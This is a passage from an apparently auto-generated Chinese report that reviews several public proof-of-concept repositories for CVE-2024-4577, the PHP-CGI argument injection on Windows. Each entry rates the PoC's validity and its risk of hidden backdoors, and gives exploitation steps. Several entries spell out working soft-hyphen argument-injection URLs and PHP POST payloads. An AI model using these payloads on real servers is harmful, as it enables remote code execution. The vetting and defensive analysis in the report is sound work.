4.  **初始化的代码：** 在main函数执行之前就调用了可疑函数,这意味着只要执行漏洞验证的代码,后门就会被执行
综上所述，该代码具有极高的投毒风险，不应在任何生产环境中使用。它会下载并执行来自未知来源的恶意脚本，危及系统安全。

**项目地址:** [shockingbonu/CVE-2024-4577-PHP-RCE](https://github.com/shockingbonu/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #47

**来源**: [CVE-2024-4577-sug4r-wr41th_CVE-2024-4577.md](../2024/CVE-2024-4577-sug4r-wr41th_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP (在 Windows 上，使用 Apache 和 PHP-CGI) 的漏洞，如果系统设置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码、在服务器上运行任意 PHP 代码等。

**有效性分析：**

根据漏洞描述和提供的PoC代码，该PoC利用了PHP-CGI在Windows系统下处理请求参数时，由于字符编码转换问题，导致攻击者可以注入恶意的PHP配置参数，例如 `allow_url_include` 和 `auto_prepend_file`，最终执行任意PHP代码。

PoC的实现方式是通过构造一个包含恶意参数的HTTP请求，利用`allow_url_include=1`开启远程文件包含，然后通过`auto_prepend_file=php://input`指定要包含的文件为请求体的内容。请求体中包含要执行的PHP代码。

**投毒风险分析：**

查看提供的PoC代码，没有明显的恶意代码，其作用是为了验证漏洞，将恶意代码注入到服务器端执行。`echo 'PWNED!'; die;` 只是一个验证是否成功利用的标志。但是不排除仓库维护者或者贡献者在后期提交恶意代码的可能性，特别是利用场景为生产环境时，存在一定的风险。

因此，投毒风险评估为10%。

**利用方式：**

1.  目标系统必须是Windows，并且PHP运行在CGI模式下。
2.  目标系统需要设置代码页，并启用"Best Fit"策略。
3.  攻击者构造包含恶意参数的HTTP请求。
4.  恶意参数利用字符编码转换漏洞，注入`allow_url_include`和`auto_prepend_file`等配置项。
5.  `allow_url_include=1` 允许包含远程文件。
6.  `auto_prepend_file=php://input` 将请求体作为要包含的文件。
7.  请求体包含要执行的PHP代码，例如`<?php system('calc')?>`，从而实现远程代码执行。

**优先级排序参考搜索引擎结果：**

搜索引擎结果表明此漏洞已经被广泛利用，并且有多种利用方法，需要及时修复。

*   [webpage 0] CVE-2024-4577 Exploits in the Wild One Day After ...说明该漏洞披露后不久就出现了在野利用。 *   [webpage 1] CVE-2024-4577 Detail - NVD 描述了漏洞允许恶意用户传递选项到 PHP 二进制文件。 *   [webpage 4, 9] 指出存在大规模利用。 总而言之，该漏洞的威胁程度高，利用简单，在野利用广泛，需要高度重视。

**项目地址:** [sug4r-wr41th/CVE-2024-4577](https://github.com/sug4r-wr41th/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #48

**来源**: [CVE-2024-4577-tntrock_CVE-2024-4577_PowerShell.md](../2024/CVE-2024-4577-tntrock_CVE-2024-4577_PowerShell.md)

## CVE-2024-4577 - PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection/Remote Code Execution

**影响应用:** PHP (Windows CGI)

**危害等级:** 高危，允许远程代码执行

**影响版本:** PHP 8.1 < 8.1.29, PHP 8.2 < 8.2.20, PHP 8.3 < 8.3.8 (Windows, CGI mode with specific codepage settings)

**利用条件:** Windows服务器，运行PHP CGI模式，并开启了特定的使用"Best Fit"策略的CodePage

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个PHP-CGI参数注入漏洞，存在于Windows版本的PHP中，当使用Apache和PHP-CGI时，如果系统设置使用某些代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码、在服务器上运行任意PHP代码等。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是一个严重的安全问题，允许攻击者远程执行代码。提供的PoC代码尝试通过构造特殊的URL，利用`allow_url_include`和`auto_prepend_file`选项包含远程文件，从而执行任意命令。PoC代码针对Windows服务器，运行PHP CGI模式的场景。因此，如果目标满足漏洞利用的条件（Windows服务器，PHP CGI，受影响版本，特定代码页），则PoC代码很可能是有效的。

**投毒风险：**
分析提供的PoC代码仓库，其中包含的 `cve_2024_4577.ps1` 脚本主要功能是针对给定的IP地址范围，尝试利用CVE-2024-4577漏洞。脚本通过构建包含恶意PHP配置指令的URL，并发送POST请求，如果目标存在漏洞，则会执行`whoami`命令。`Invoke-RequestForIP` 函数也包括了错误处理，如果请求失败会返回错误信息，降低了误判的可能性。脚本本身看起来比较直接，投毒风险较低。主要风险点可能在于利用成功后的服务器被控制，但PoC本身的功能仅限于利用漏洞，并未发现其他恶意行为。因此，将该仓库判定为存在投毒代码的可能性较低。当然，这并不排除作者在其他未公开的代码中包含恶意行为的可能性。

**利用方式：**
1.  **环境准备：** 目标系统必须是Windows服务器，运行受影响版本的PHP，并以CGI模式运行。
2.  **确定目标IP和协议：**  扫描目标IP地址，确定哪些服务器启用了PHP CGI服务，并支持HTTP或HTTPS协议。
3.  **构造恶意URL：**  构造包含特殊参数的URL，例如：`http://target/php-cgi/php-cgi.exe?%add+allow_url_include%3Don+-d+auto_prepend_file%3Dphp%3A//input+-d+cgi.force_redirect%3D0`
4.  **发送POST请求：**  向构造的URL发送POST请求，请求体包含需要执行的PHP代码，例如：`<?php system('whoami'); die(); ?>`
5.  **执行命令：**  如果目标存在漏洞，PHP CGI将执行POST请求体中的PHP代码，攻击者即可在服务器上执行任意命令。

**总结：**
CVE-2024-4577是一个高危漏洞，利用条件较为苛刻，需要特定的Windows + PHP + CGI配置。提供的PoC代码有效性较高，可以用于验证漏洞是否存在。仓库中投毒风险较低，但仍需保持警惕。

**项目地址:** [tntrock/CVE-2024-4577_PowerShell](https://github.com/tntrock/CVE-2024-4577_PowerShell)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #49

**来源**: [CVE-2024-4577-waived_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-waived_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI模式)

**利用条件:** PHP 在 Windows 下以 CGI 模式运行，且系统配置使用包含 "Best Fit" 策略的编码页。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，当 PHP 在 Windows 下以 CGI 模式运行时，如果系统配置使用包含 "Best Fit" 策略的编码页，攻击者可以通过构造特殊字符绕过安全检查，将恶意参数传递给 PHP 解释器，导致远程代码执行。

**漏洞利用方式：**

1.  **利用原理：** Windows 的 "Best Fit" 编码转换可能会将请求中的特定字符转换为其他字符，从而绕过 PHP 的安全过滤。攻击者可以利用这一点，注入 `-d` 参数来修改 PHP 的配置。
2.  **攻击方式：**  根据漏洞库信息和POC代码，攻击者可以通过在URL中构造类似 `/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input` 这样的 Payload。 其中 `%AD` 字符可能经过 "Best Fit" 转换后，仍然能够被 PHP 解析为 `-d` 参数的一部分。
3.  **Payload 解释：**
    *   `allow_url_include=1`： 允许包含远程文件。
    *   `auto_prepend_file=php://input`：  设置在执行 PHP 代码之前自动包含的文件为 `php://input`，这意味着请求体中的内容会被当作 PHP 代码执行。
4.  **执行流程：** 攻击者发送包含恶意 PHP 代码的 POST 请求，由于 `auto_prepend_file` 被设置为 `php://input`，恶意代码会被执行，从而实现远程代码执行。

**关于投毒风险：**

分析提供的 POC 代码，该代码主要用于检测目标是否存在 CVE-2024-4577 漏洞。代码逻辑是发送包含特定参数的 HTTP POST 请求，并检查响应中是否包含 "PHP Version" 字符串。如果存在，则认为目标存在漏洞。没有发现任何隐藏的、恶意的功能，因此投毒风险为 0%。

综上所述，提供的 POC 代码有效，且不存在投毒风险。利用方式是利用 Windows 的 "Best Fit" 编码转换特性，通过构造特殊的 URL 和 POST 请求，将恶意 PHP 代码注入到目标服务器执行，最终实现远程代码执行。

**项目地址:** [waived/CVE-2024-4577-PHP-RCE](https://github.com/waived/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #50

**来源**: [CVE-2024-4577-watchtowrlabs_CVE-2024-4577.md](../2024/CVE-2024-4577-watchtowrlabs_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** PHP

**危害等级:** 严重，可导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, Best Fit code page)

**利用条件:** Windows服务器，PHP以CGI模式运行，启用使用"Best Fit"策略的代码页

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 漏洞存在于 Windows 环境下以 CGI 模式运行的 PHP 中。当系统配置为使用某些代码页时，Windows 可能会使用 “Best-Fit” 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源码，或者在服务器上执行任意 PHP 代码。

**有效性分析：**
根据漏洞库信息、搜索引擎结果（如Akamai观察到漏洞利用尝试）和提供的漏洞利用代码（POC），可以判断该漏洞利用是有效的。POC代码通过构造包含恶意 PHP 选项的 URL，成功执行了系统命令（calc）。

**投毒风险分析：**
分析提供的POC代码，主要的风险点在于用户指定的`-c`参数，攻击者可通过该参数执行任意PHP代码。仓库本身存在投毒的可能性较低。大部分代码是用于构造payload和发送请求，直接利用该代码进行投毒的可能性较低。 风险评估为5%（极低，主要来自对外部payload的依赖和代码的可修改性）。

**利用方式：**
1.  **环境准备：** 目标服务器必须是 Windows 系统，并且 PHP 以 CGI 模式运行，同时配置了使用 “Best Fit” 策略的代码页。
2.  **构造 Payload：** 使用 POC 代码，通过 `-c` 参数指定要执行的 PHP 代码。例如，执行 `system('calc')` 打开计算器。
3.  **发送请求：** 将构造好的 Payload 附加到目标 URL 后面，通过 POST 请求发送到目标服务器。
4.  **利用原理：**  由于 “Best Fit” 行为，Windows 会对 URL 中的某些字符进行替换，使得 PHP CGI 模块错误地将这些字符解释为 PHP 选项。例如，`?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input`，这允许攻击者包含远程文件或者直接执行 POST 数据中的 PHP 代码。
5.  **RCE:** 成功利用漏洞后，服务器将执行攻击者指定的 PHP 代码，实现远程代码执行。

**项目地址:** [watchtowrlabs/CVE-2024-4577](https://github.com/watchtowrlabs/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #51

**来源**: [CVE-2024-4577-xAL6_cve-2024-4577-scanner.md](../2024/CVE-2024-4577-xAL6_cve-2024-4577-scanner.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* (before 8.1.29), 8.2.* (before 8.2.20), 8.3.* (before 8.3.8)

**利用条件:** Windows系统，运行在CGI模式下，并且系统启用了某些使用"Best Fit"策略的代码页。需要目标存在php-cgi/php-cgi.exe等CGI文件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于Windows系统上运行在CGI模式下的PHP。当系统配置为使用某些代码页时，Windows可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户向 PHP 二进制文件传递选项，进而泄露脚本源码，或在服务器上执行任意 PHP 代码。 

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含特定字符（例如软连字符 0xAD）的 URL，这些字符在某些 Windows 代码页转换中会被错误地解释为短划线或其他控制字符。
2.  **参数注入：** 经过转换后的字符被 PHP-CGI 模块解析为命令行参数，从而允许攻击者控制传递给 PHP 解释器的参数。
3.  **远程代码执行：** 通过注入参数，攻击者可以利用`auto_prepend_file`等配置项包含远程文件或执行任意 PHP 代码，从而实现远程代码执行。

**POC有效性：**

提供的PoC代码 `scan.py` 旨在扫描目标是否存在 CVE-2024-4577 漏洞。它通过发送包含特殊构造的payload的HTTP请求，并检查响应中是否包含预期的输出来判断漏洞是否存在。PoC代码逻辑清晰，包含构建payload、发送请求、解析响应等步骤，因此是有效的。

**投毒风险：**

PoC代码本身功能为漏洞扫描，其主要功能在于验证目标是否存在漏洞，而非进行攻击。其中包含的payload是为了验证漏洞存在，而不是植入后门。但是，PoC代码中依赖了第三方库，如 `requests`， `urllib3`，`chardet`等。如果这些依赖包被恶意篡改，则可能存在投毒风险。 经过分析，认为此仓库中作者隐藏的投毒代码的可能性较低，概率约为5%。主要的风险在于第三方依赖库可能被投毒。


**项目地址:** [xAL6/cve-2024-4577-scanner](https://github.com/xAL6/cve-2024-4577-scanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #52

**来源**: [CVE-2024-4577-xcanwin_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-xcanwin_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577 PHP-CGI RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows with CGI)

**利用条件:** Windows 系统, PHP 以 CGI 模式运行, 且系统配置为使用某些代码页并开启“Best Fit”策略。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 远程代码执行漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时，由于 Windows 的“Best-Fit”代码页转换行为，攻击者可以通过构造特殊字符，使得传递给 PHP 二进制文件的命令行参数被错误解析，从而注入恶意 PHP 配置项，最终实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，此漏洞利用是有效的。漏洞库信息将其标记为“CRITICAL”，并且CISA的已知漏洞利用目录 (KEV) 中也包含了此漏洞，表明该漏洞已被积极利用。搜索结果也证实了这一点，众多安全厂商都观察到了该漏洞的利用尝试。

**投毒风险：**

虽然提供的 Python 脚本 `CVE-2024-4577-PHP-RCE.py` 看起来主要用于漏洞利用，但仍存在一些潜在的投毒风险，可能性评估为10%。

1.  **依赖风险：** 该脚本依赖 `requests` 和 `socket` 库，如果运行脚本的环境中这些库被篡改，则可能导致恶意代码执行。但这种风险属于环境依赖，而非代码本身包含恶意逻辑。
2.  **隐蔽性：** EXP1建立fastcgi端口监听，可能被攻击者利用进行持久性控制，如果被恶意攻击者修改，会导致服务端被持续控制。
3.  **脚本功能：** 脚本本身包含两个EXP，EXP1可用于绕过WAF和默认环境的利用, EXP2可用于SSRF和默认场景。

总体来说，这个PoC的投毒风险较低，主要集中在依赖库和脚本被篡改的可能性上。如果直接从作者提供的git仓库中下载, 投毒风险会更低,因为代码经过更多人的review.

**利用方式：**

该漏洞的利用方式涉及以下几个步骤：

1.  **触发代码页转换：** 攻击者构造包含特定多字节字符的 URL 或请求，这些字符会被 Windows 的“Best-Fit”策略转换为其他字符。
2.  **注入 PHP 配置项：** 转换后的字符被 PHP-CGI 模块错误地解析为 PHP 配置项，例如 `allow_url_include` 和 `auto_prepend_file`。
3.  **包含远程文件或执行代码：** 通过设置 `allow_url_include` 为 `on` 并结合 `auto_prepend_file`，攻击者可以包含远程文件或直接执行 PHP 代码。例如，可以使用 `data://` 协议注入恶意 PHP 代码。

提供的 POC 代码 `CVE-2024-4577-PHP-RCE.py` 包含两种利用方式:

*   **EXP1:**  通过建立 FastCGI 服务端，并发送构造好的 FastCGI 协议数据，实现绕过 WAF 的 RCE。
*   **EXP2:** 模拟HTTP请求，通过`?%adb{}:{}` 在请求中注入特定的字符。这种方法模拟了攻击者通过发送畸形请求来触发漏洞的行为。

总而言之，该漏洞利用需要在特定的 Windows + PHP-CGI 环境下，通过构造特殊的请求来注入恶意 PHP 配置项，最终实现远程代码执行。

**项目地址:** [xcanwin/CVE-2024-4577-PHP-RCE](https://github.com/xcanwin/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #53

**来源**: [CVE-2024-4577-ywChen-NTUST_PHP-CGI-RCE-Scanner.md](../2024/CVE-2024-4577-ywChen-NTUST_PHP-CGI-RCE-Scanner.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入/远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 严重，可能导致远程代码执行，信息泄露

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下的PHP，并且系统启用了使用"Best Fit"策略的编码页。需要目标开启php-cgi服务。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577 是一个存在于 Windows 版本的 PHP 中的严重漏洞，当 PHP 在 CGI 模式下运行时，可能会导致远程代码执行。该漏洞源于 Windows 的 "Best Fit" 编码转换行为，当系统设置为使用某些代码页时，Windows 可能会使用 "Best Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。 PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上运行任意 PHP 代码。

**漏洞利用方式：**

1.  **检测php-cgi服务是否存在:**  攻击者首先需要确定目标服务器是否运行在 Windows 上，并且使用了 CGI 模式的 PHP。可通过访问`/php-cgi/php-cgi.exe`来判断，如果返回500状态码，则可能存在漏洞。
2.  **编码绕过:** 由于Best-Fit转换的存在，某些字符会被替换，因此攻击者需要构造特殊的URL，利用这一特性，将恶意参数注入到PHP命令中。
3.  **参数注入:** 通过在 URL 中添加 `?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input` 这样的参数，可以强制 `cgi.force_redirect` 为任意值，开启 `allow_url_include` 选项，并且将 `auto_prepend_file` 设置为 `php://input`。`php://input` 允许攻击者通过 POST 请求的内容来执行 PHP 代码。
4.  **代码执行:**  攻击者通过 POST 请求发送恶意的 PHP 代码，例如 `<?php phpinfo();?>`，由于 `auto_prepend_file` 被设置为 `php://input`，这段代码会被 PHP 执行，从而实现远程代码执行。

**POC有效性：**

提供的 POC 代码看起来是有效的。它包含了以下关键步骤：

*   **连接性检查:**  `check_connectivity` 函数用于检测目标 URL 是否可访问。
*   **CGI 存在性检查:**  `check_cgi_exist` 函数检测 `/php-cgi/php-cgi.exe` 是否存在。
*   **PHP 版本获取:**  `get_phpversion` 函数尝试从响应头或响应内容中获取 PHP 版本。
*   **漏洞利用:**  `exploit` 函数通过构造包含恶意参数的 URL，并发送包含 PHP 代码的 POST 请求来利用漏洞。 通过判断`phpinfo()`的执行结果判断是否成功。

**投毒风险分析：**

代码主要功能为扫描和利用 CVE-2024-4577，本身功能较为直接。`requirements.txt` 只包含 `requests` 库，没有引入其他可疑的依赖项。因此投毒风险较低，判断投毒风险为1%。 主要风险在于使用者需要自行配置 `urls.txt`，如果该文件被恶意修改，可能会导致扫描错误的 URL。


**项目地址:** [ywChen-NTUST/PHP-CGI-RCE-Scanner](https://github.com/ywChen-NTUST/PHP-CGI-RCE-Scanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---



---

## POC #42

**来源**: [CVE-2024-4577-mr-won_php-cgi-cve-2024-4577.md](../2024/CVE-2024-4577-mr-won_php-cgi-cve-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP-CGI参数注入漏洞，存在于Windows系统上的PHP CGI实现中。当PHP以CGI模式运行时，如果系统启用了使用"Best Fit"策略的代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符，导致PHP CGI模块错误地将这些字符解释为PHP选项，攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意参数，从而实现远程代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞已经确认有效，并且存在公开的PoC代码，Metasploit也发布了相应的利用模块。 Akamai的研究表明，漏洞披露后不久就观察到了大量的利用尝试。

**投毒风险：**

提供的PoC代码实际上是一个README.md文件，描述了对CVE-2024-4577的事件检测。其中提到了利用`%AD`进行参数注入，服务器通过自动转换功能（Best-fit）可能会将该字符转换为其他可执行的参数，从而进行二次攻击。代码本身没有明显的投毒行为，但存在通过代码描述引导攻击者进行恶意利用的可能性。因此,该存储库存在的投毒风险较低，大约10%。

**利用方式：**

1.  **环境要求：** 受影响的PHP版本（8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8）、Windows服务器、PHP以CGI模式运行、系统启用使用"Best Fit"策略的代码页。
2.  **漏洞触发：** 攻击者构造包含特殊字符（如`%AD`）的URL，发送给目标服务器。
3.  **参数注入：** Windows的"Best Fit"机制将特殊字符转换为其他字符，PHP CGI模块错误地将转换后的字符解析为PHP选项。
4.  **代码执行：** 攻击者可以通过注入`-d`参数来修改php.ini配置，例如禁用`disable_functions`，或者通过其他方式执行任意PHP代码。
5.  **远程控制：** 成功执行PHP代码后，攻击者可以获取服务器的控制权。

**项目地址:** [mr-won/php-cgi-cve-2024-4577](https://github.com/mr-won/php-cgi-cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #43

**来源**: [CVE-2024-4577-olebris_CVE-2024-4577.md](../2024/CVE-2024-4577-olebris_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* (before 8.1.29), 8.2.* (before 8.2.20), 8.3.* (before 8.3.8)

**利用条件:** Windows系统，运行于CGI模式，系统启用了使用"Best Fit"策略的代码页，使用Apache

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为替换命令行中的字符，PHP CGI模块可能会将这些字符错误地解释为PHP选项。这允许攻击者向正在运行的PHP二进制文件传递选项，从而可能泄露脚本的源代码、在服务器上运行任意PHP代码等。根据提供的漏洞利用代码，利用方式是通过POST请求向目标服务器发送特定的URL和请求头，其中URL包含恶意的PHP选项，例如`allow_url_include`和`auto_prepend_file`。请求体包含PHP代码（例如`<?php phpinfo(); ?>`）。如果服务器存在漏洞，服务器将执行请求体中的PHP代码，从而允许攻击者执行任意代码。

提供的POC代码的有效性较高，因为它直接利用了漏洞描述中提到的`allow_url_include`和`auto_prepend_file`选项来执行任意PHP代码。

关于投毒风险，分析POC代码本身，该脚本的功能是验证目标站点是否存在CVE-2024-4577漏洞。它通过发送包含`phpinfo()`函数的POST请求来判断目标是否易受攻击。脚本没有发现任何恶意或隐藏的投毒代码。脚本只是用于检测漏洞，而不是植入后门或其他恶意软件。
根据搜索引擎结果，此漏洞已经被大规模利用，证明此漏洞的利用难度低且影响广泛。

**项目地址:** [olebris/CVE-2024-4577](https://github.com/olebris/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #44

**来源**: [CVE-2024-4577-phirojshah_CVE-2024-4577.md](../2024/CVE-2024-4577-phirojshah_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行漏洞

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI 模式)

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个影响 Windows 系统上 PHP-CGI 的远程代码执行漏洞。当 PHP 在 CGI 模式下运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的利用代码。Akamai 的研究表明，漏洞披露后一天内就出现了大量的利用尝试。CISA 也已将此漏洞添加到已知被利用的漏洞列表中，表明该漏洞在野外已被积极利用。提供的 POC 代码通过发送包含特制参数的 HTTP POST 请求来利用此漏洞，如果目标服务器存在漏洞，则可以执行任意 PHP 代码。因此, POC代码是有效的。

**投毒风险：**
检查提供的 Python 脚本 `CVE-2024-4577.py` 和 `README.md` 文件，没有发现明显的恶意代码。该脚本的功能主要是扫描目标 URL 是否存在漏洞，如果存在则利用该漏洞执行指定的 PHP 代码。`README.md` 文件只包含漏洞的描述、安装和使用说明。但是，任何下载和使用的第三方代码都存在一定风险。用户需要仔细审查代码，确保其行为符合预期，并且来自可信的来源。

投毒风险评估: 10% 。 这个评估是因为代码本身看起来没有恶意行为，但是任何第三方脚本都存在潜在风险，例如：

*   **依赖项风险：** 脚本依赖于 `requests` 和 `colorama` 库。这些依赖项可能包含未知的漏洞，如果被攻击者利用，可能会影响脚本的安全性。
*   **Payload 风险：** 脚本允许用户指定要执行的 PHP payload 文件。如果用户不小心使用了恶意的 payload 文件，可能会导致服务器受到攻击。
*   **作者恶意：** 脚本作者可能在未来的版本中引入恶意代码。

**利用方式：**

1.  **确定目标系统：** 首先需要确定目标系统是否满足漏洞利用的条件，即：Windows 系统，PHP 以 CGI 模式运行，并且启用了使用 "Best Fit" 策略的代码页。
2.  **发送特制的 HTTP 请求：** 攻击者需要构造一个包含特制参数的 HTTP 请求，例如 `?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。这个参数会传递给 PHP CGI 模块，使其错误地解释为 PHP 选项。
3.  **执行任意 PHP 代码：** 通过 POST 请求发送包含要执行的 PHP 代码的 payload。由于 `auto_prepend_file` 参数被设置为 `php://input`，PHP 会将 POST 请求的内容作为 PHP 代码执行。因此,通过修改和控制POST的内容,即可控制目标服务器。

此漏洞的严重性在于，未经身份验证的攻击者可以利用此漏洞在受影响的服务器上执行任意代码，从而完全控制服务器。

**项目地址:** [phirojshah/CVE-2024-4577](https://github.com/phirojshah/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #45

**来源**: [CVE-2024-4577-r0otk3r_CVE-2024-4577.md](../2024/CVE-2024-4577-r0otk3r_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入-RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行于CGI模式，启用了使用"Best Fit"策略的代码页，使用Apache服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个存在于Windows环境下PHP-CGI模式中的参数注入漏洞。当系统配置为使用某些代码页时，Windows可能会使用"Best-Fit"策略替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而泄露脚本源代码或在服务器上执行任意PHP代码。

**利用方式：**

1.  攻击者通过构造包含特殊字符的URL发起请求。
2.  Windows的"Best-Fit"策略将这些特殊字符转换为其他字符。
3.  PHP-CGI错误地将转换后的字符解析为PHP选项。
